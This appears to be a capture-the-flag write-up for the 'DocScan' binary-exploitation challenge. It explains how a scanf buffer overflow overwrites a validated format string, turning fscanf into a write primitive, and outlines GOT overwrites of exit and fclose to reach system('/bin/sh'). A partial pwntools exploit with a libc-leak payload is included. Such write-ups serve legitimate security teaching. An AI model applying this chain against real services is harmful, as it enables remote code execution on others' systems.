# DocScan

**Category:** Binary Exploitation  
**Points:** 211  

---

## Challenge Description
We are given a binary called `docscan.bin`, a set of test files in `docs/`, and a `libc.so.6`. A `test.sh` script demonstrates usage.

```bash
rethier@kali:~$ tree --charset unicode
.
|-- Dockerfile
|-- docs
|   |-- chars.txt
|   |-- floats.txt
|   |-- ints.txt
|   `-- strs.txt
|-- docscan.bin
|-- libc.so.6
`-- test.sh
```

Running the program:

```bash
rethier@kali:~$ ./docscan.bin 
*** DocScan (v0.01) ***
Enter format: int
Enter quantity: 7
Enter filename: docs/ints.txt
Scanning...
 raw data: 0000000000000001
 raw data: 0000000000000064
 ...
Done! Scanned 7 items
```

---

## Vulnerability
Through reverse engineering we find:

- **Global data segment layout:**
  ```c
  FILE *fp;
  int count;
  char filename[32];
  char format[32];
  ```
- Both `filename` and `format` are read with `scanf("%s", ...)`, making them **vulnerable to buffer overflow**.
- Overflowing `filename` can overwrite `format` after it has been validated → leading to a **format string vulnerability** inside `fscanf()`.

**Key Insight:** By overflowing `filename` with controlled bytes, we can hijack the `format` string and weaponize it as a format string vuln.

---

## Exploitation Strategy
1. Use `/dev/stdin` (or `/proc/self/fd/0`) as the “file” so we can control the input stream.  
2. Abuse `fscanf()` with malicious format strings.  
3. Craft a **write-what-where primitive** by overwriting stack arguments.  
4. Redirect GOT entries (`exit`, `fclose`) to leak addresses and eventually call `system("/bin/sh")`.

---

## Exploit Code
```python
from pwn import *

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <local|remote> [host] [port]")
    exit(0)
elif sys.argv[1] == "local":
    p = process("./docscan.bin")
    e = p.elf
    l = e.libc
elif sys.argv[1] == "remote":
    p = remote(sys.argv[2], sys.argv[3])
    e = ELF("./docscan.bin")
    l = ELF("./libc.so.6")

writable = e.symbols['format']+0x20

# Stage 1: Leak a libc pointer
p.sendline(b"int")
p.sendline(b"3")
p.sendline(b"/proc/self/fd/0" + b"\0"*(32-15) + b"%11$lu%15$lu")
...
# Stage 2: Place "/bin/sh" and redirect fclose → system()
...
p.interactive()
```

---

## Flag
`MetaCTF{redacted}`  

---

## Takeaways
- Buffer overflows can chain into format string vulns.  
- `scanf()` family can be just as dangerous as `printf()` when misused.  
- GOT overwrites remain a powerful path to shell when RELRO is partial.  
